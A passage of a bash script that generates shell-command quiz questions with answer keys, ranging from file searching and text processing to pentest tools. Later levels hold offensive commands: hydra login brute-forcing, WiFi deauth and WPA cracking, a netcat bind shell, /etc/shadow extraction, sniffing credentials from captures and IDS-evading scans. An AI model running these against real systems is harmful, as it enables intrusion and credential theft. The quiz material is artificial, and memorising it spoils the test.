  questions+=("Find 'config' files (case-insensitive)|find . -iname '*config*'|fd -i config")
  questions+=("Find files matching '*test*' pattern|find . -name '*test*'|fd test")

  # By size
  questions+=("Find files larger than ${size}|find . -size +${size}|fd -S +${size}")
  questions+=("Find files smaller than ${size}|find . -size -${size}|fd -S -${size}")
  questions+=("Find empty files|find . -type f -empty|fd -t e -t f")

  # By time
  questions+=("Find files modified in last ${time} minutes|find . -mmin -${time}|fd --changed-within ${time}m")
  questions+=("Find files NOT modified in last 7 days|find . -mtime +7|fd --changed-before 7d")
  questions+=("Find files accessed in last hour|find . -amin -60|fd --changed-within 1h")

  # By type
  questions+=("Find directories only|find . -type d|fd -t d")
  questions+=("Find regular files only|find . -type f|fd -t f")
  questions+=("Find symlinks only|find . -type l|fd -t l")
  questions+=("Find executable files|find . -type f -executable|fd -t x")

  # Hidden and exclusions
  questions+=("Find all files including hidden (fd excludes hidden by default)|fd -H")
  questions+=("Find all, excluding .git directory|find . -not -path './.git/*'|fd -E .git")
  questions+=("Find .${ext} files, excluding ${dir}/|find . -name '*.${ext}' -not -path './${dir}/*'|fd -e ${ext} -E ${dir}")
  questions+=("Find files excluding multiple dirs|find . -not -path './node_modules/*' -not -path './.git/*'|fd -E node_modules -E .git")

  # Path matching
  questions+=("Find files in paths matching */${dir}/*|find . -path '*/${dir}/*'|fd -p ${dir}/")
  questions+=("Find test files in src directory|find . -path '*/src/*' -name '*test*'|fd -p 'src/.*test'")

  # Max depth
  questions+=("Find .${ext} files, max 2 levels deep|find . -maxdepth 2 -name '*.${ext}'|fd -e ${ext} -d 2")
  questions+=("Find only in current dir (no recursion)|find . -maxdepth 1 -type f|fd -d 1 -t f")

  printf '%s\n' "${questions[@]}"
}

# Level 5: Data Processing (sort, uniq, cut, awk, ps, ss, ip)
gen_level16() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local proc2=$(_pick PROCS) col2=$(_rnum 1 5) col3=$((col + 1)) chars=$(_rnum 10 80) thresh=$(_rnum 50 500)

  # Sorting - with flag order alternatives
  questions+=("$(_phrase "Sort" "Order") ${txt} alphabetically|sort ${txt}")
  questions+=("Sort ${txt} in reverse order|sort -r ${txt}")
  questions+=("Sort ${txt} numerically|sort -n ${txt}")
  questions+=("Sort ${txt} numerically, descending|sort -rn ${txt}|sort -nr ${txt}")
  questions+=("Sort and remove duplicates|sort -u ${txt}")
  questions+=("Sort ${csv} by column ${col}|sort -t',' -k${col} ${csv}")
  questions+=("Sort ${csv} by column ${col} numerically|sort -t',' -k${col}n ${csv}|sort -t',' -nk${col} ${csv}")
  questions+=("Sort ${csv} by column ${col} descending|sort -t',' -k${col}rn ${csv}|sort -t',' -rnk${col} ${csv}")
  questions+=("Sort by human-readable sizes (1K, 2M, 3G)|sort -h")
  questions+=("Sort ${txt} case-insensitively|sort -f ${txt}|sort --ignore-case ${txt}")
  questions+=("Sort ${csv} by column ${col} then ${col2}|sort -t',' -k${col},${col} -k${col2},${col2} ${csv}")

  # Uniqueness - more variations
  questions+=("Remove adjacent duplicate lines|uniq ${txt}")
  questions+=("Count occurrences of each unique line|sort ${txt} | uniq -c")
  questions+=("Show only duplicate lines§sort ${txt} | uniq -d")
  questions+=("Show only unique lines (appear once)§sort ${txt} | uniq -u")
  questions+=("Count unique lines in ${txt}§sort ${txt} | uniq | wc -l§sort -u ${txt} | wc -l")
  questions+=("Show all duplicates (repeated lines)§sort ${txt} | uniq -D")

  # Cutting columns - dynamic
  questions+=("Extract column ${col} from ${csv} (comma-delimited)|cut -d',' -f${col} ${csv}")
  questions+=("Extract columns ${col} and ${col3} from ${csv}|cut -d',' -f${col},${col3} ${csv}")
  questions+=("Extract columns ${col} through ${col3}|cut -d',' -f${col}-${col3} ${csv}")
  questions+=("Extract first ${chars} characters of each line|cut -c1-${chars} ${txt}")
  questions+=("Extract from character ${chars} to end of line|cut -c${chars}- ${txt}")
  questions+=("Extract column ${col} from colon-separated file|cut -d':' -f${col} /etc/passwd")
  questions+=("Extract all but column ${col}|cut -d',' --complement -f${col} ${csv}")
  questions+=("Extract using tab delimiter|cut -f${col} ${txt}")

  # Basic awk - more patterns with dynamic values
  questions+=("$(_phrase "Print" "Output" "Show") first column of ${txt}|awk '{print \$1}' ${txt}")
  questions+=("Print last column of each line|awk '{print \$NF}' ${txt}")
  questions+=("Print columns ${col} and ${col2}|awk '{print \$${col}, \$${col2}}' ${txt}")
  questions+=("Print lines longer than ${chars} chars|awk 'length > ${chars}' ${txt}")
  questions+=("Print line numbers with content|awk '{print NR, \$0}' ${txt}")
  questions+=("Sum numbers in column ${col} of ${csv}|awk -F',' '{sum+=\$${col}} END {print sum}' ${csv}")
  questions+=("Print lines where column ${col} > ${thresh}|awk -F',' '\$${col} > ${thresh}' ${csv}")
  questions+=("Print lines where column ${col} equals \"${field}\"|awk -F',' '\$${col} == \"${field}\"' ${csv}")
  questions+=("Print every ${col}th line|awk 'NR % ${col} == 0' ${txt}")
  questions+=("Print lines ${n} through ${n2}|awk 'NR>=${n} && NR<=${n2}' ${txt}|sed -n '${n},${n2}p' ${txt}")
  questions+=("Average of column ${col}|awk -F',' '{sum+=\$${col}; count++} END {print sum/count}' ${csv}")
  questions+=("Maximum value in column ${col}|awk -F',' 'BEGIN{max=0} \$${col}>max{max=\$${col}} END{print max}' ${csv}")
  questions+=("Print fields in reverse order|awk '{for(i=NF;i>0;i--) printf \"%s \", \$i; print \"\"}' ${txt}")
  questions+=("Print unique values from column ${col}|awk -F',' '!seen[\$${col}]++' ${csv}")
  questions+=("Count records by column ${col} value|awk -F',' '{count[\$${col}]++} END {for(k in count) print k, count[k]}' ${csv}")

  # Field manipulation with tr
  questions+=("Replace spaces with tabs|tr ' ' '\\t' < ${txt}")
  questions+=("Delete all digits from ${txt}|tr -d '0-9' < ${txt}")
  questions+=("Squeeze multiple spaces to single|tr -s ' ' < ${txt}")
  questions+=("Convert to lowercase|tr 'A-Z' 'a-z' < ${txt}|tr '[:upper:]' '[:lower:]' < ${txt}")
  questions+=("Convert to uppercase|tr 'a-z' 'A-Z' < ${txt}|tr '[:lower:]' '[:upper:]' < ${txt}")
  questions+=("Delete all whitespace|tr -d '[:space:]' < ${txt}")
  questions+=("Replace newlines with spaces|tr '\\n' ' ' < ${txt}")
  questions+=("Transliterate characters|tr 'abc' 'xyz' < ${txt}")

  # Useful pipes - dynamic counts
  questions+=("Top ${n} most common lines in ${log}§sort ${log} | uniq -c | sort -rn | head -${n}§sort ${log} | uniq -c | sort -nr | head -${n}")
  questions+=("Count unique values in column ${col}§cut -d',' -f${col} ${csv} | sort | uniq -c")
  questions+=("Extract and count unique IPs from ${log}§grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log} | sort | uniq -c | sort -rn")
  questions+=("Most common words in ${txt}§tr -s ' ' '\\n' < ${txt} | sort | uniq -c | sort -rn | head")
  questions+=("Lines appearing in both ${txt} and ${txt2}§sort ${txt} ${txt2} | uniq -d§comm -12 <(sort ${txt}) <(sort ${txt2})")
  questions+=("Lines only in ${txt}, not ${txt2}|comm -23 <(sort ${txt}) <(sort ${txt2})")

  # Process management - with dynamic process names
  questions+=("List all processes|ps aux")
  questions+=("$(_phrase "Find" "Show" "List") processes matching '${proc}'§ps aux | grep ${proc}§pgrep -a ${proc}")
  questions+=("Get PID of ${proc}|pgrep ${proc}|pidof ${proc}")
  questions+=("Kill ${proc} process|pkill ${proc}")
  questions+=("Kill all processes matching '${proc}'|pkill -f ${proc}")
  questions+=("Kill ${proc} with SIGKILL|pkill -9 ${proc}|pkill -KILL ${proc}")
  questions+=("Show process tree|ps auxf|pstree")
  questions+=("Show process tree for ${proc}|pstree -p \$(pgrep ${proc})")
  questions+=("Find what's using port ${port}§ss -tlpn | grep ${port}§lsof -i :${port}")
  questions+=("List processes sorted by CPU usage§ps aux --sort=-%cpu | head")
  questions+=("List processes sorted by memory usage§ps aux --sort=-%mem | head")
  questions+=("Show top ${n} processes by memory§ps aux --sort=-%mem | head -${n}")
  questions+=("Find zombie processes§ps aux | grep -w Z§ps aux | awk '\$8==\"Z\"'")

  # Modern network info (ip/ss)
  questions+=("$(_phrase "Show" "Display" "List") IP addresses|ip addr|ip a")
  questions+=("Show routing table|ip route|ip r")
  questions+=("Show listening TCP ports|ss -tlpn|ss -tlnp")
  questions+=("Show all TCP connections|ss -ta|ss -at")
  questions+=("Show UDP listeners|ss -ulpn|ss -ulnp")
  questions+=("Show connections to port ${port}|ss -tn sport = :${port}")
  questions+=("Show established connections|ss -t state established")
  questions+=("Show socket statistics summary|ss -s")
  questions+=("Show connections by process|ss -tp")

  printf '%s\n' "${questions[@]}"
}

# Level 9: Batch Operations (find -exec, xargs, sed, systemctl, journalctl)
gen_level19() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local svc2=$(_pick SERVICES) parallel=$(_rnum 2 8) linenum=$(_rnum 1 20)

  # find -exec - with flag alternatives
  questions+=("Run ls -l on each .${ext} file found|find . -name '*.${ext}' -exec ls -l {} \\;|fd -e ${ext} -x ls -l {}")
  questions+=("Count lines in each .${ext} file|find . -name '*.${ext}' -exec wc -l {} \\;|fd -e ${ext} -x wc -l {}")
  questions+=("Delete all .${ext2} files|find . -name '*.${ext2}' -delete|fd -e ${ext2} -x rm {}")
  questions+=("Make all .sh files executable|find . -name '*.sh' -exec chmod +x {} \\;|fd -e sh -x chmod +x {}")
  questions+=("Search '${term}' in each .${ext} file|find . -name '*.${ext}' -exec grep ${term} {} \\;|fd -e ${ext} -x rg ${term} {}")
  questions+=("Show size of files larger than ${size}|find . -size +${size} -exec du -h {} \\;|fd -S +${size} -x du -h {}")
  questions+=("Copy all .${ext} files to ${dir}/|find . -name '*.${ext}' -exec cp {} ${dir}/ \\;|fd -e ${ext} -x cp {} ${dir}/")
  questions+=("Move all .${ext2} files to ${dir}/|find . -name '*.${ext2}' -exec mv {} ${dir}/ \\;|fd -e ${ext2} -x mv {} ${dir}/")
  questions+=("Change owner of all files in ${dir}/|find ${dir}/ -exec chown user:group {} \\;")
  questions+=("Gzip all .${ext} files|find . -name '*.${ext}' -exec gzip {} \\;|fd -e ${ext} -x gzip {}")

  # Batch with + (more efficient)
  questions+=("List all .${ext} files in one ls call|find . -name '*.${ext}' -exec ls -l {} +")
  questions+=("Count total lines across all .${ext} files|find . -name '*.${ext}' -exec wc -l {} + | tail -1")
  questions+=("Cat all .${ext} files together|find . -name '*.${ext}' -exec cat {} +")

  # sed replacement - more patterns
  questions+=("Replace '${old}' with '${new}' in ${cfg}|sed -i 's/${old}/${new}/g' ${cfg}|sd '${old}' '${new}' ${cfg}")
  questions+=("Replace '${old}' with '${new}' (first occurrence only)|sed -i 's/${old}/${new}/' ${cfg}")
  questions+=("Delete lines containing '${term}' in ${log}|sed -i '/${term}/d' ${log}")
  questions+=("Delete empty lines from ${txt}|sed -i '/^$/d' ${txt}")
  questions+=("Delete lines ${linenum} to $((linenum + n)) from ${txt}|sed -i '${linenum},$((linenum + n))d' ${txt}")
  questions+=("Add prefix 'LOG: ' to each line|sed -i 's/^/LOG: /' ${log}")
  questions+=("Add suffix '.bak' to each line|sed -i 's/\$/.bak/' ${txt}")
  questions+=("Replace '${old}' in all .${ext} files|find . -name '*.${ext}' -exec sed -i 's/${old}/${new}/g' {} \\;|fd -e ${ext} -x sd '${old}' '${new}' {}")
  questions+=("Case-insensitive replace '${old}'|sed -i 's/${old}/${new}/gi' ${cfg}")
  questions+=("Print only lines matching '${term}'|sed -n '/${term}/p' ${log}")
  questions+=("Insert text at line ${linenum}|sed -i '${linenum}i\\inserted text' ${txt}")
  questions+=("Append text after line ${linenum}|sed -i '${linenum}a\\appended text' ${txt}")

  # xargs - building commands from stdin
  questions+=("Delete files listed in ${txt}§cat ${txt} | xargs rm§xargs rm < ${txt}")
  questions+=("Run grep on files from find§find . -name '*.${ext}' | xargs grep ${term}")
  questions+=("Process files with spaces in names§find . -name '*.${ext}' -print0 | xargs -0 wc -l")
  questions+=("Run commands in parallel (${parallel} jobs)§find . -name '*.${ext}' | xargs -P ${parallel} -I {} process {}")
  questions+=("Confirm before each delete§find . -name '*.${ext2}' | xargs -p rm")
  questions+=("Limit xargs to ${n} arguments per command§cat ${txt} | xargs -n ${n} echo")
  questions+=("Replace placeholder {} in command§cat ${txt} | xargs -I {} echo \"Processing {}\"")
  questions+=("Show commands without executing (dry run)§cat ${txt} | xargs -t echo")

  # Combined operations
  questions+=("Find .${ext} files > ${size}, show sizes sorted|find . -name '*.${ext}' -size +${size} -exec du -h {} \\; | sort -rh")
  questions+=("Replace and backup: ${old} -> ${new}, keep .bak|sed -i.bak 's/${old}/${new}/g' ${cfg}")
  questions+=("Find and replace recursively in ${dir}/|find ${dir}/ -type f -exec sed -i 's/${old}/${new}/g' {} \\;")

  # Systemd service management - DYNAMIC service names
  questions+=("Check status of ${svc} service|systemctl status ${svc}")
  questions+=("Start ${svc} service|systemctl start ${svc}|sudo systemctl start ${svc}")
  questions+=("Stop ${svc} service|systemctl stop ${svc}|sudo systemctl stop ${svc}")
  questions+=("Restart ${svc} service|systemctl restart ${svc}|sudo systemctl restart ${svc}")
  questions+=("Enable ${svc} to start on boot|systemctl enable ${svc}|sudo systemctl enable ${svc}")
  questions+=("Disable ${svc} from starting on boot|systemctl disable ${svc}|sudo systemctl disable ${svc}")
  questions+=("Reload ${svc} config without restart|systemctl reload ${svc}|sudo systemctl reload ${svc}")
  questions+=("Check if ${svc} is enabled|systemctl is-enabled ${svc}")
  questions+=("Check if ${svc} is active|systemctl is-active ${svc}")
  questions+=("Show ${svc} unit file|systemctl cat ${svc}")
  questions+=("Edit ${svc} unit file override|systemctl edit ${svc}|sudo systemctl edit ${svc}")
  questions+=("List all running services|systemctl list-units --type=service --state=running")
  questions+=("List failed services|systemctl --failed")
  questions+=("Mask ${svc} (prevent starting)|systemctl mask ${svc}|sudo systemctl mask ${svc}")
  questions+=("Unmask ${svc}|systemctl unmask ${svc}|sudo systemctl unmask ${svc}")
  questions+=("Daemon reload after unit file change|systemctl daemon-reload|sudo systemctl daemon-reload")

  # Journalctl - DYNAMIC service names and line counts
  questions+=("View logs for ${svc} service|journalctl -u ${svc}")
  questions+=("Follow logs for ${svc} in realtime|journalctl -u ${svc} -f|journalctl -fu ${svc}")
  questions+=("View last ${n2} log lines for ${svc}|journalctl -u ${svc} -n ${n2}")
  questions+=("View logs since boot|journalctl -b")
  questions+=("View kernel messages|journalctl -k|dmesg")
  questions+=("View logs from last hour|journalctl --since '1 hour ago'")
  questions+=("View logs from last ${n} minutes|journalctl --since '${n} minutes ago'")
  questions+=("View errors only|journalctl -p err|journalctl -p 3")
  questions+=("View ${svc} errors only|journalctl -u ${svc} -p err")
  questions+=("Disk usage of journal|journalctl --disk-usage")
  questions+=("Vacuum journal to ${size}|journalctl --vacuum-size=${size}|sudo journalctl --vacuum-size=${size}")
  questions+=("Output as JSON|journalctl -u ${svc} -o json")

  printf '%s\n' "${questions[@]}"
}

# Level 12: Network Scanning (nmap)
gen_level23() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  port2=$((port + 1000))

  # Basic scans
  questions+=("Scan all 65535 ports on ${ip}|nmap -p- ${ip}")
  questions+=("Scan top 100 most common ports on ${ip}|nmap --top-ports 100 ${ip}")
  questions+=("Scan specific ports ${port},${port2} on ${ip}|nmap -p ${port},${port2} ${ip}")
  questions+=("Scan port range 1-1000 on ${ip}|nmap -p 1-1000 ${ip}")
  questions+=("Fast scan (top 100 ports) on ${ip}|nmap -F ${ip}")

  # Service/version detection
  questions+=("Detect service versions (banner grab) on ${ip}|nmap -sV ${ip}")
  questions+=("OS fingerprinting via TCP/IP stack on ${ip}|nmap -O ${ip}")
  questions+=("Aggressive scan (-A = OS, version, scripts, traceroute)|nmap -A ${ip}")
  questions+=("Run default NSE scripts (-sC) on ${ip}|nmap -sC ${ip}")
  questions+=("Combined recon: version + scripts on ${ip}|nmap -sV -sC ${ip}")

  # Scan types
  questions+=("UDP scan top 20 ports on ${ip}|nmap -sU --top-ports 20 ${ip}")
  questions+=("TCP connect scan on ${ip} (full handshake)|nmap -sT ${ip}")
  questions+=("TCP SYN scan on ${ip} (stealth, default)|nmap -sS ${ip}")
  questions+=("Scan ${ip}, skip host discovery (treat as up)|nmap -Pn ${ip}")

  # Network discovery
  questions+=("Ping sweep ${subnet} (find live hosts)|nmap -sn ${subnet}")
  questions+=("List targets in ${subnet} without scanning|nmap -sL ${subnet}")
  questions+=("ARP scan local network ${subnet}|nmap -PR -sn ${subnet}")

  # Output formats
  questions+=("Scan ${ip}, save all formats to 'scan' prefix|nmap -oA scan ${ip}")
  questions+=("Scan ${ip}, save greppable output to scan.gnmap|nmap -oG scan.gnmap ${ip}")

  # Scripts
  questions+=("Run vulnerability scripts on ${ip}|nmap --script vuln ${ip}")
  questions+=("Banner grab port ${port} on ${ip}|nmap -sV -p ${port} --script banner ${ip}")
  questions+=("Enumerate SMB shares on ${ip}|nmap --script smb-enum-shares ${ip}")
  questions+=("Enumerate HTTP methods on ${ip}|nmap --script http-methods -p 80,443 ${ip}")
  questions+=("Check for anonymous FTP on ${ip}|nmap --script ftp-anon -p 21 ${ip}")

  # Speed and stealth
  questions+=("Scan ${ip} through proxychains (anonymize)|proxychains nmap -sT ${ip}")
  questions+=("Slow scan ${ip} (evade IDS)|nmap -T1 ${ip}")
  questions+=("Aggressive timing scan ${ip} (faster)|nmap -T4 ${ip}")

  # Combined
  questions+=("Full scan: all ports, version, scripts, all outputs|nmap -p- -sV -sC -oA full ${ip}")

  printf '%s\n' "${questions[@]}"
}

# Level 14: Hash Cracking & Encoding (hashcat, john, hydra)
gen_level25() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local hidx=$((RANDOM % ${#HASHCAT_MODES[@]})) hmode=${HASHCAT_MODES[$hidx]} hname=${HASH_NAMES[$hidx]}

  # Hashcat dictionary attacks
  questions+=("Dictionary attack on MD5 (-m 0) hashes in ${hash}|hashcat -m 0 ${hash} ${wordlist}")
  questions+=("Dictionary attack on ${hname} (-m ${hmode}) hashes|hashcat -m ${hmode} ${hash} ${wordlist}")
  questions+=("Crack Windows NTLM hashes (-m 1000) in ${hash}|hashcat -m 1000 ${hash} ${wordlist}")

  # Hashcat brute force
  questions+=("Brute force 4-digit PIN (MD5)|hashcat -m 0 -a 3 ${hash} ?d?d?d?d")
  questions+=("Mask attack: Capital + 5 lower + 2 digits|hashcat -m 0 -a 3 ${hash} ?u?l?l?l?l?l?d?d")

  # Hashcat rules & session
  questions+=("Crack ${hash} with rules file|hashcat -m 0 -r rules/best64.rule ${hash} ${wordlist}")
  questions+=("Show already cracked from ${hash}|hashcat -m 0 ${hash} --show")
  questions+=("Resume interrupted hashcat session|hashcat --restore")

  # John the Ripper
  questions+=("Crack ${hash} with john (auto-detect format)|john ${hash}")
  questions+=("Crack ${hash} with john using ${wordlist}|john --wordlist=${wordlist} ${hash}")
  questions+=("Show cracked passwords from john|john --show ${hash}")
  questions+=("List supported john formats|john --list=formats")

  # John hash extraction (FIXED - was incorrect before)
  questions+=("Extract hash from encrypted ZIP file|zip2john archive.zip > hash.txt")
  questions+=("Extract hash from encrypted PDF|pdf2john document.pdf > hash.txt")
  questions+=("Extract hash from encrypted RAR|rar2john archive.rar > hash.txt")
  questions+=("Extract hash from /etc/shadow format|unshadow /etc/passwd /etc/shadow > hash.txt")

  # Hydra
  questions+=("Brute force SSH login for ${user} on ${ip}|hydra -l ${user} -P ${wordlist} ${ip} ssh")
  questions+=("Brute force FTP login for ${user} on ${ip}|hydra -l ${user} -P ${wordlist} ${ip} ftp")
  questions+=("Brute force HTTP basic auth on ${ip}|hydra -l ${user} -P ${wordlist} ${ip} http-get /")
  questions+=("Brute force HTTP POST login form|hydra -l ${user} -P ${wordlist} ${ip} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'")
  questions+=("Brute force with username list too|hydra -L users.txt -P ${wordlist} ${ip} ssh")
  questions+=("Limit hydra to 4 parallel tasks|hydra -t 4 -l ${user} -P ${wordlist} ${ip} ssh")

  # Encoding/decoding
  questions+=("Encode string 'secret' to base64|echo -n 'secret' | base64")
  questions+=("Decode base64 file encoded.txt|base64 -d encoded.txt")
  questions+=("Generate MD5 hash of string 'password'|echo -n 'password' | md5sum")
  questions+=("Generate SHA256 hash of string|echo -n 'password' | sha256sum")
  questions+=("Generate SHA256 hash of file ${hash}|sha256sum ${hash}")

  # Hex operations
  questions+=("Convert 'hello' to hex|echo -n 'hello' | xxd -p")
  questions+=("Convert hex back to ascii|echo '68656c6c6f' | xxd -r -p")
  questions+=("Hex dump of file with addresses|xxd ${hash}")
  questions+=("Hex dump plain (no addresses)|xxd -p ${hash}")

  # URL encoding (useful for web testing)
  questions+=("URL encode a string|python3 -c \"import urllib.parse; print(urllib.parse.quote('test string'))\"")

  printf '%s\n' "${questions[@]}"
}

# Level 15: Forensics & Binary Analysis
gen_level26() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # String extraction
  questions+=("Extract ASCII strings from ${bin}|strings ${bin}")
  questions+=("Extract strings minimum 10 chars|strings -n 10 ${bin}")
  questions+=("Extract Unicode strings (Windows binaries)|strings -e l ${bin}")
  questions+=("Find URLs in binary|strings ${bin} | grep -E 'https?://'")
  questions+=("Find email addresses in binary|strings ${bin} | grep -E '[A-Za-z0-9._%+-]+@'")

  # ELF analysis
  questions+=("Show ELF file header|readelf -h ${bin}")
  questions+=("Show ELF symbols|readelf -s ${bin}")
  questions+=("Show all ELF info|readelf -a ${bin}")
  questions+=("List shared library dependencies|ldd ${bin}")

  # Radare2
  questions+=("Analyze ${bin} with radare2|r2 -A ${bin}")
  questions+=("Disassemble main function|r2 -qc 'aaa; pdf @main' ${bin}")
  questions+=("List functions in binary|r2 -qc 'aaa; afl' ${bin}")

  # Binwalk
  questions+=("Scan ${bin} for embedded files|binwalk ${bin}")
  questions+=("Extract embedded files from ${bin}|binwalk -e ${bin}")
  questions+=("Analyze entropy of ${bin}|binwalk -E ${bin}")

  # Memory forensics (volatility3) - most common
  questions+=("List processes from memory dump|volatility3 -f ${img} windows.pslist")
  questions+=("List network connections from memory|volatility3 -f ${img} windows.netscan")

  # File metadata
  questions+=("Extract all metadata from ${photo}|exiftool ${photo}")
  questions+=("Extract GPS coordinates from photo|exiftool -gps* ${photo}")
  questions+=("Remove all metadata from ${photo}|exiftool -all= ${photo}")

  # Disk imaging
  questions+=("Create disk image of /dev/sda|dd if=/dev/sda of=${img} bs=4M status=progress")
  questions+=("Mount disk image read-only|mount -o ro,loop ${img} /mnt/evidence")
  questions+=("Verify checksums file|sha256sum -c ${hash}")

  printf '%s\n' "${questions[@]}"
}

# Level 11: Network Tools (tshark, curl, wget, ssh, openssl, jq)
gen_level22() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # tshark - packet capture & analysis
  questions+=("Capture traffic on ${iface} to ${pcap}|tshark -i ${iface} -w ${pcap}")
  questions+=("Capture only 100 packets|tshark -i ${iface} -c 100 -w ${pcap}")
  questions+=("Read and display ${pcap}|tshark -r ${pcap}")
  questions+=("Filter HTTP traffic from ${pcap}|tshark -r ${pcap} -Y http")
  questions+=("Filter traffic to/from ${ip}|tshark -r ${pcap} -Y 'ip.addr == ${ip}'")
  questions+=("Show only DNS queries|tshark -r ${pcap} -Y 'dns.qry.name'")
  questions+=("Extract HTTP POST data|tshark -r ${pcap} -Y 'http.request.method == POST' -T fields -e http.file_data")
  questions+=("Extract all URLs from capture|tshark -r ${pcap} -Y 'http.request' -T fields -e http.host -e http.request.uri")
  questions+=("Show TCP conversations|tshark -r ${pcap} -q -z conv,tcp")
  questions+=("Extract credentials (FTP, HTTP basic)§tshark -r ${pcap} -Y 'ftp.request.command == PASS || http.authbasic'")

  # jq - JSON processing (ESSENTIAL modern skill)
  questions+=("Pretty print JSON file|jq '.' data.json")
  questions+=("Extract '${key}' array from JSON|jq '.${key}' data.json")
  questions+=("Extract first item from '${key}' array|jq '.${key}[0]' data.json")
  questions+=("Extract 'name' field from each item|jq '.${key}[] | .name' data.json")
  questions+=("Filter items where status is 'active'|jq '.${key}[] | select(.status == \"active\")' data.json")
  questions+=("Count items in array|jq '.${key} | length' data.json")
  questions+=("Get keys of JSON object|jq 'keys' data.json")
  questions+=("Compact JSON (remove whitespace)|jq -c '.' data.json")
  questions+=("Create new object from fields|jq '.${key}[] | {name: .name, id: .id}' data.json")
  questions+=("Parse JSON from curl output|curl -s ${url}/api | jq '.${key}'")

  # curl - HTTP client (ESSENTIAL)
  questions+=("GET request to ${url}|curl ${url}")
  questions+=("GET request with headers shown|curl -i ${url}")
  questions+=("POST JSON data|curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"}' ${url}/api")
  questions+=("POST form data|curl -X POST -d 'user=admin&pass=test' ${url}/login")
  questions+=("Follow redirects|curl -L ${url}")
  questions+=("Save output to file|curl -o output.html ${url}")
  questions+=("Send with custom header|curl -H 'Authorization: Bearer token123' ${url}/api")
  questions+=("Silent mode (no progress)|curl -s ${url}")
  questions+=("Download file with original name|curl -O ${url}/file.tar.gz")

  # SSH tunneling (CRITICAL for pentesting)
  questions+=("SSH local port forward: access remote ${port} via local 8080|ssh -L 8080:localhost:${port} ${user}@${host}")
  questions+=("SSH remote port forward: expose local ${port} on remote|ssh -R ${port}:localhost:${port} ${user}@${host}")
  questions+=("SSH dynamic SOCKS proxy on port 1080|ssh -D 1080 ${user}@${host}")
  questions+=("SSH through jump host to target|ssh -J ${user}@jump ${user}@target")
  questions+=("SSH tunnel in background|ssh -fN -L 8080:localhost:80 ${user}@${host}")
  questions+=("SSH execute remote command|ssh ${user}@${host} 'ls -la'")
  questions+=("SCP file to remote|scp file.txt ${user}@${host}:/tmp/")
  questions+=("Rsync with progress|rsync -avz --progress file.txt ${user}@${host}:/backup/")

  # wget (alternative to curl)
  questions+=("Download file with wget|wget ${url}/file.tar.gz")
  questions+=("Continue interrupted download|wget -c ${url}/large.iso")
  questions+=("Mirror website for offline|wget -mk ${url}")

  # OpenSSL (cert checking, encryption)
  questions+=("Check SSL cert of website|openssl s_client -connect ${host}:443")
  questions+=("Generate random 32-byte hex string|openssl rand -hex 32")
  questions+=("Encrypt file with AES-256|openssl enc -aes-256-cbc -salt -in file.txt -out file.enc")
  questions+=("Decrypt AES-256 file|openssl enc -d -aes-256-cbc -in file.enc -out file.txt")
  questions+=("Generate RSA key pair|openssl genrsa -out key.pem 4096")

  printf '%s\n' "${questions[@]}"
}

# Level 13: Local Network & RF (wifi, smb, netcat, masscan)
gen_level24() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # WiFi attacks
  questions+=("Enable monitor mode on ${iface}|airmon-ng start ${iface}")
  questions+=("Scan for WiFi networks|airodump-ng ${iface}mon")
  questions+=("Capture handshake from specific AP|airodump-ng -c 6 --bssid ${mac} -w capture ${iface}mon")
  questions+=("Send deauth packets to force handshake|aireplay-ng -0 5 -a ${mac} ${iface}mon")
  questions+=("Crack WPA handshake with wordlist|aircrack-ng -w ${wordlist} capture.cap")

  # SMB/NetBIOS
  questions+=("List SMB shares anonymously on ${ip}|smbclient -L //${ip} -N")
  questions+=("Connect to SMB share|smbclient //${ip}/share -U ${user}")
  questions+=("Enumerate SMB with enum4linux|enum4linux -a ${ip}")

  # Netcat
  questions+=("Start reverse shell listener on port ${port}|nc -lvnp ${port}")
  questions+=("Connect to remote port|nc ${ip} ${port}")
  questions+=("Send file via netcat|nc ${ip} ${port} < file.txt")
  questions+=("Port scan with netcat|nc -zv ${ip} 1-1000")
  questions+=("Netcat bind shell|nc -lvnp ${port} -e /bin/bash")

  # Mass scanning
  questions+=("Mass scan all ports on subnet at 10k rate|masscan -p1-65535 ${ip%.*}.0/24 --rate 10000")
  questions+=("Masscan specific ports|masscan -p 22,80,443 ${ip%.*}.0/24 --rate 1000")

  # Security audit
  questions+=("Run full system security audit|lynis audit system")

  printf '%s\n' "${questions[@]}"
}

# Level 6: String Manipulation & Arrays
gen_level17() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # Parameter expansion - removal (practical examples)
  questions+=("Extract filename from /path/to/${txt} (stored in \$path)|echo \${path##*/}")
  questions+=("Get parent directory from \$fullpath|echo \${fullpath%/*}")
  questions+=("Get extension from ${cfg} (stored in \$file)|echo \${file##*.}")
